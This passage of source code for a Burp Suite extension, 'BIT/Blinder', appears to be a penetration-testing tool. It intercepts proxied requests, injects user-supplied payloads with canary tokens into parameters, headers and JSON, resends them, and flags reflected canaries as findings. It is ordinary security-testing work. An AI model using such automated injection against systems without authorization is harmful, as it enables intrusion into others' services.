        self.auto_encode.setSelected(bool(cfg.get("AutoEncode", True)))
        self.in_scope_only.setSelected(bool(cfg.get("InScopeOnly", True)))
        self.detect_reflections.setSelected(
            bool(cfg.get("DetectReflections", True))
        )
        self.append_canary.setSelected(bool(cfg.get("AppendCanary", True)))
        self.add_to_site_map.setSelected(bool(cfg.get("AddToSiteMap", True)))
        self.headers_list.setText("\n".join(cfg.get("Headers", [])))
        self.exclude_hosts_list.setText(
            "\n".join(cfg.get("ExcludeHosts", []))
        )
        self.exclude_paths_list.setText(
            "\n".join(cfg.get("ExcludePaths", []))
        )
        self.exclude_params_list.setText(
            "\n".join(cfg.get("ExcludeParams", []))
        )
        self.rate_limit.setText(str(cfg.get("RateLimitMs", 0)))
        self.dedup_ms.setText(str(
            cfg.get("DedupCooldownMs", DEFAULT_DEDUP_COOLDOWN_MS)
        ))
        self.pool_size.setText(str(cfg.get("PoolSize", DEFAULT_POOL_SIZE)))
        self.queue_size.setText(str(cfg.get("QueueSize", DEFAULT_QUEUE_SIZE)))
        self.per_host_permits.setText(str(
            cfg.get("PerHostPermits", DEFAULT_PER_HOST_PERMITS)
        ))
        self.max_body_size.setText(str(
            cfg.get("MaxBodySize", DEFAULT_MAX_BODY_SIZE)
        ))
        if self.extender is not None:
            self.extender.apply_config_changes(cfg)

    # ---- status / activity helpers ---------------------------------------

    def set_status(self, text):
        owner = self

        def update():
            owner.status_label.setText(text)
        self._run_on_ui(update)

    def add_activity_row(self, row):
        owner = self

        def update():
            owner.activity_model.add_row(row)
        self._run_on_ui(update)

    def add_finding(self, finding):
        owner = self

        def update():
            owner.findings_model.add(finding)
            owner._refresh_findings_count()
        self._run_on_ui(update)

    def _refresh_findings_count(self):
        try:
            n = self.findings_model.getRowCount()
            self.findings_count_label.setText("%d findings" % n)
        except Exception:
            pass

    def replace_findings(self, findings):
        owner = self

        def update():
            owner.findings_model.replace_all(findings)
            owner._refresh_findings_count()
        self._run_on_ui(update)

    def append_activity(self, text):
        # Lightweight status line update only.
        self.set_status(text)

    def append_activity_detail(self, text):
        if self.get_verbose_activity():
            self.set_status(text)

    def update_validation(self):
        warnings = []
        if not self.get_payloads():
            warnings.append("Add at least one payload.")
        if self.inject_headers.isSelected() and not self.get_header_names():
            warnings.append("Header injection enabled but list is empty.")
        if self.get_detect_reflections() and not self.get_append_canary():
            # Without a canary somewhere, reflection detection has nothing
            # to look for - warn loudly.
            if not any("$(canary)" in p for p in self.get_payloads()):
                warnings.append(
                    "Detect reflections is on but no payload contains "
                    "$(canary) and 'Append canary token' is off."
                )
        if not self.get_auto_encode():
            warnings.append("Auto-encode off: payloads inserted raw.")
        if warnings:
            self.validation_label.setText("Warning: " + " ".join(warnings))
            self.validation_label.setForeground(
                SEVERITY_COLORS.get(SEVERITY_HIGH)
            )
        else:
            self.validation_label.setText("Ready")
            self.validation_label.setForeground(
                Color(0x55, 0x88, 0x55)
            )


def _shell_quote(s):
    if s is None:
        return "''"
    s = str(s)
    if all(c.isalnum() or c in "@%+=:,./-" for c in s):
        return s
    return "'" + s.replace("'", "'\\''") + "'"


class _SimpleDocListener(DocumentListener):
    def __init__(self, fn):
        self.fn = fn

    def changedUpdate(self, e):
        self._fire()

    def insertUpdate(self, e):
        self._fire()

    def removeUpdate(self, e):
        self._fire()

    def _fire(self):
        try:
            self.fn()
        except Exception:
            pass


# ---------------------------------------------------------------------------
# BurpExtender - the orchestrator
# ---------------------------------------------------------------------------

class BurpExtender(IBurpExtender, IHttpListener, ITab, IExtensionStateListener):

    def getTabCaption(self):
        return "Bit Blinder"

    def getUiComponent(self):
        return self.ui.panel

    # ---- lifecycle --------------------------------------------------------

    def registerExtenderCallbacks(self, callbacks):
        self.callbacks = callbacks
        self.helpers = callbacks.getHelpers()
        self.callbacks.setExtensionName("BIT/Blinder")

        sys.stdout = self.callbacks.getStdout()

        self.ui = GUI()
        self.ui.callbacks = callbacks
        self.ui.extender = self
        self.ui.gui()
        self.callbacks.customizeUiComponent(self.ui.panel)
        self.callbacks.addSuiteTab(self)
        self.callbacks.registerHttpListener(self)
        self.callbacks.registerExtensionStateListener(self)

        # State
        self.rate_lock = PyLock()
        self.last_request_ms = {}
        self.request_id = AtomicLong(0)
        self.stat_total = AtomicInteger(0)
        self.stat_sent = AtomicInteger(0)
        self.stat_skipped = AtomicInteger(0)
        self.stat_reflected = AtomicInteger(0)

        self.canary = Canary()
        self.detector = ReflectionDetector(self.helpers)
        self.planner = InjectionPlanner(self.helpers, self.canary)
        self.fingerprinter = Fingerprinter()
        self._findings_dirty = AtomicInteger(0)
        self._persist_lock = PyLock()

        self.ui.load_settings()
        # Default config snapshot derived from current UI state.
        self._config_snapshot = self._build_config_snapshot()
        self.fingerprinter.set_cooldown(self._config_snapshot["dedup_ms"])
        self.pool = self._build_pool(self._config_snapshot)
        self._load_findings()

        self.ui.append_activity("BitBlinder %s loaded" % VERSION)
        return

    def extensionUnloaded(self):
        try:
            self._persist_findings()
        except Exception:
            pass
        try:
            if self.pool is not None:
                self.pool.shutdown()
        except Exception:
            pass
        try:
            if self.canary is not None:
                self.canary.clear()
        except Exception:
            pass
        try:
            if self.fingerprinter is not None:
                self.fingerprinter.clear()
        except Exception:
            pass

    # ---- config helpers ---------------------------------------------------

    def _build_config_snapshot(self):
        ui = self.ui
        return {
            "payloads": ui.get_payloads(),
            "randomize": ui.randomize.isSelected(),
            "inject_headers": ui.inject_headers.isSelected(),
            "inject_json": ui.get_inject_json(),
            "json_strings_only": ui.get_json_strings_only(),
            "auto_encode": ui.get_auto_encode(),
            "in_scope_only": ui.get_in_scope_only(),
            "detect_reflections": ui.get_detect_reflections(),
            "append_canary": ui.get_append_canary(),
            "add_to_site_map": ui.get_add_to_site_map(),
            "header_names": ui.get_header_names(),
            "exclude_hosts": ui.get_exclude_hosts(),
            "exclude_paths": ui.get_exclude_paths(),
            "exclude_params_lower": [
                p.lower() for p in ui.get_exclude_params()
            ],
            "rate_limit_ms": ui.get_rate_limit_ms(),
            "dedup_ms": ui.get_dedup_ms(),
            "pool_size": ui.get_pool_size(),
            "queue_size": ui.get_queue_size(),
            "per_host_permits": ui.get_per_host_permits(),
            "max_body_size": ui.get_max_body_size(),
        }

    def apply_config_changes(self, cfg):
        """Called by GUI after Save/Load - rebuild dependent runtime state."""
        snapshot = self._build_config_snapshot()
        self._config_snapshot = snapshot
        self.fingerprinter.set_cooldown(snapshot["dedup_ms"])
        # Pool sizes can't be changed live; rebuild if changed.
        try:
            if (getattr(self, "pool", None) is None or
                self.pool.pool_size != snapshot["pool_size"] or
                self.pool.queue_size != snapshot["queue_size"] or
                self.pool.per_host_permits !=
                    snapshot["per_host_permits"]):
                old = getattr(self, "pool", None)
                self.pool = self._build_pool(snapshot)
                if old is not None:
                    old.shutdown()
        except Exception as exc:
            self.ui.set_status("Pool reconfigure failed: %s" % exc)

    def _build_pool(self, cfg):
        owner = self

        def on_err(msg):
            owner.ui.set_status("worker: %s" % msg)
        return WorkerPool(
            cfg["pool_size"],
            cfg["queue_size"],
            cfg["per_host_permits"],
            on_err,
        )

    # ---- proxy hook --------------------------------------------------------

    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        # Only consume Proxy traffic.  Scanner / Repeater / Intruder would
        # otherwise have their requests silently mutated.
        if toolFlag != self.callbacks.TOOL_PROXY:
            return
        if not messageIsRequest:
            return
        if not self.ui.enable.isSelected():
            return

        try:
            request = messageInfo.getRequest()
            request_info = self.helpers.analyzeRequest(messageInfo)
        except Exception:
            return

        try:
            url = request_info.getUrl()
        except Exception:
            return

        cfg = self._config_snapshot

        if cfg["in_scope_only"] and not self.callbacks.isInScope(url):
            return

        headers = list(request_info.getHeaders())
        # Loop prevention: never inject into our own request.
        if self._has_ignore_header(headers):
            return

        http_service = messageInfo.getHttpService()
        host = http_service.getHost()
        port = http_service.getPort()
        https = http_service.getProtocol().lower() == "https"
        method = request_info.getMethod()
        path = url.getPath()

        if self._is_excluded_host(host, cfg["exclude_hosts"]):
            self._record_skip(host, method, path, "Excluded host")
            return
        if self._is_excluded_path(path, cfg["exclude_paths"]):
            self._record_skip(host, method, path, "Excluded path")
            return

        # Body cap (lightweight, decided on the listener thread).
        body_offset = request_info.getBodyOffset()
        body_len = max(0, len(request) - body_offset)
        if body_len > cfg["max_body_size"]:
            self._record_skip(host, method, path,
                              "Body too large (%d B)" % body_len)
            return

        # Per-host rate limit.
        rate_ms = cfg["rate_limit_ms"]
        if rate_ms > 0:
            now_ms = int(time.time() * 1000)
            key = "%s:%s" % (host, port)
            with self.rate_lock:
                last = self.last_request_ms.get(key, 0)
                if last and (now_ms - last) < rate_ms:
                    self._record_skip(host, method, path, "Rate limited")
                    return
                self.last_request_ms[key] = now_ms

        # Payload presence check.
        if not cfg["payloads"]:
            self._record_skip(host, method, path, "No payloads")
            return

        # Fingerprint dedup.
        param_names = []
        try:
            param_names = sorted(p.getName() for p in
                                 request_info.getParameters()
                                 if p.getType() in OP_INJECTION_PARAMS)
        except Exception:
            pass
        fingerprint = (
            method, host, port, path,
            tuple(param_names),
            bool(cfg["inject_headers"]),
            bool(cfg["inject_json"]),
        )
        if not self.fingerprinter.should_inject(fingerprint):
            self._record_skip(host, method, path, "Deduplicated")
            return

        # Plan injections.
        try:
            injections = self.planner.plan(
                request, request_info, http_service, cfg
            )
        except Exception as exc:
            self._record_skip(host, method, path,
                              "Plan error: %s" % exc)
            return

        if not injections:
            self._record_skip(host, method, path, "No injection points")
            return

        # Snapshot the original request bytes (for Send to Repeater later).
        try:
            original_request_b64 = _bytes_to_b64(request)
        except Exception:
            original_request_b64 = ""

        req_id = int(self.request_id.incrementAndGet())
        if self.ui.get_verbose_activity():
            self.ui.append_activity(
                "[%s] #%d %s %s%s (points: %d)" %
                (now_str(), req_id, method, host, path, len(injections))
            )

        self.stat_total.incrementAndGet()

        # Enqueue each injection on the worker pool.
        for inj in injections:
            self._enqueue_injection(
                req_id, http_service, host, port, https, method, path,
                inj, original_request_b64, cfg
            )

        self._update_status()

    # ---- per-injection worker --------------------------------------------

    def _enqueue_injection(self, req_id, http_service, host, port, https,
                           method, path, injection, original_request_b64,
                           cfg):
        owner = self
        canary = injection.canary

        # Register the canary so a late reflection (if we ever post-process
        # off the response side) could attribute back; primary attribution
        # happens inline below.
        if canary:
            self.canary.register(canary, {
                "host": host, "port": port, "https": https,
                "method": method, "path": path,
                "kind": injection.kind, "where": injection.where,
                "payload": injection.payload,
            })

        def run():
            try:
                resp_msg = owner.callbacks.makeHttpRequest(
                    http_service, injection.request_bytes
                )
                resp = resp_msg.getResponse() if resp_msg else None
            except Exception as exc:
                owner._post_activity([
                    now_str(), req_id, host, method, path,
                    injection.kind, injection.where,
                    "ERR", 0, "send error: %s" % exc,
                ])
                return

            status_code = 0
            size = 0
            if resp is None:
                owner._post_activity([
                    now_str(), req_id, host, method, path,
                    injection.kind, injection.where,
                    "—", 0, "no response",
                ])
                owner.stat_sent.incrementAndGet()
                owner._update_status()
                return

            try:
                resp_info = owner.helpers.analyzeResponse(resp)
                status_code = int(resp_info.getStatusCode())
                size = max(0, len(resp) - resp_info.getBodyOffset())
            except Exception:
                pass

            owner._post_activity([
                now_str(), req_id, host, method, path,
                injection.kind, injection.where,
                status_code, size, "sent",
            ])
            owner.stat_sent.incrementAndGet()

            # Reflection detection.
            if cfg["detect_reflections"] and canary:
                try:
                    body_hits = owner.detector.scan_body(
                        resp, canary, injection.payload
                    )
                except Exception:
                    body_hits = []
                try:
                    header_hits = owner.detector.scan_headers(resp, canary)
                except Exception:
                    header_hits = []
                all_hits = body_hits + header_hits
                if all_hits:
                    # Reduce to a single finding row per injection: use the
                    # highest-severity hit but mention all contexts.
                    all_hits.sort(
                        key=lambda h: SEVERITY_RANK.get(h[1], 0),
                        reverse=True,
                    )
                    top = all_hits[0]
                    contexts = ",".join(
                        sorted(set(h[0] for h in all_hits))
                    )
                    finding = Finding(
                        now_str(), host, port, https, method, path,
                        injection.kind, injection.where,
                        top[1], contexts, status_code, size,
                        injection.payload, canary, top[2],
                        original_request_b64,
                        _bytes_to_b64(injection.request_bytes),
                    )
                    owner.ui.add_finding(finding)
                    owner.stat_reflected.incrementAndGet()
                    owner._mark_findings_dirty()

                    # Highlight reflections in Burp's response viewer via
                    # applyMarkers + addToSiteMap.  Best-effort; never let a
                    # marker hiccup break detection.
                    if cfg.get("add_to_site_map", True):
                        try:
                            canary_b = owner.helpers.stringToBytes(canary)
                            req_markers = _collect_marker_ranges(
                                owner.helpers, injection.request_bytes,
                                canary_b,
                            )
                            resp_markers = _collect_marker_ranges(
                                owner.helpers, resp, canary_b,
                            )
                            if (req_markers.size() > 0 or
                                    resp_markers.size() > 0):
                                marked = owner.callbacks.applyMarkers(
                                    resp_msg,
                                    req_markers if req_markers.size() > 0
                                    else None,
                                    resp_markers if resp_markers.size() > 0
                                    else None,
                                )
                                owner.callbacks.addToSiteMap(marked)
                        except Exception as exc:
                            owner.ui.set_status(
                                "marker apply failed: %s" % exc
                            )
            owner._update_status()

        try:
            self.pool.submit(host, run)
        except Exception as exc:
            self._post_activity([
                now_str(), req_id, host, method, path,
                injection.kind, injection.where,
                "—", 0, "enqueue failed: %s" % exc,
            ])

    # ---- skip / activity / status -----------------------------------------

    def _record_skip(self, host, method, path, note):
        self.stat_total.incrementAndGet()
        self.stat_skipped.incrementAndGet()
        self._post_activity([
            now_str(), 0, host, method, path,
            "—", "—", "—", 0, note,
        ])
        self._update_status()

    def _post_activity(self, row):
        self.ui.add_activity_row(row)

    def _update_status(self):
        ui = self.ui
        text = ("Requests: %d | Sent: %d | Skipped: %d | "
                "Reflected: %d | Queue: %d | Canaries: %d") % (
            int(self.stat_total.get()),
            int(self.stat_sent.get()),
            int(self.stat_skipped.get()),
            int(self.stat_reflected.get()),
            self.pool.queue_depth() if self.pool else 0,
            self.canary.size() if self.canary else 0,
        )
        ui.set_status(text)

    # ---- header / exclusion helpers ---------------------------------------

    def _has_ignore_header(self, headers):
        target = OP_IGNORE_HEADER.lower()
        for header in headers:
            parts = header.split(":", 1)
            if len(parts) != 2:
                continue
            if (parts[0].strip().lower() == target and
                    parts[1].strip().lower() == "yes"):
                return True
        return False

    def _is_excluded_host(self, host, exclude_hosts):
        host_l = host.lower()
        for item in exclude_hosts:
            it_l = item.lower()
            if host_l == it_l:
                return True
            if host_l.endswith("." + it_l):
                return True
        return False

    def _is_excluded_path(self, path, exclude_paths):
        for item in exclude_paths:
            if path == item or path.startswith(item):
                return True
        return False

    # ---- findings persistence ---------------------------------------------

    def _load_findings(self):
        try:
            raw = self.callbacks.loadExtensionSetting(FINDINGS_KEY)
            if not raw:
                return
            data = json.loads(raw)
            findings = [Finding.from_dict(d) for d in data]
            self.ui.replace_findings(findings)
        except Exception as exc:
            self.ui.set_status("Failed to load findings: %s" % exc)

    def _persist_findings(self):
        with self._persist_lock:
            try:
                data = [f.to_dict() for f in self.ui.findings_model.all()]
                self.callbacks.saveExtensionSetting(
                    FINDINGS_KEY, json.dumps(data[:FINDINGS_MAX])
                )
            except Exception as exc:
                self.ui.set_status("Failed to persist findings: %s" % exc)

    def _mark_findings_dirty(self):
        # Persist every N additions so we don't write on every finding.
        n = self._findings_dirty.incrementAndGet()
        if n >= 25:
            self._findings_dirty.set(0)
            try:
                self._persist_findings()
            except Exception:
                pass

    def persist_findings_throttled(self):
        # Triggered from UI actions (delete / mark-fp / clear).  Always
        # persists; throttle keeps writes manageable.
        self._mark_findings_dirty()
        # Force an immediate write since this is a user-initiated mutation.
        try:
            self._persist_findings()
        except Exception:
            pass


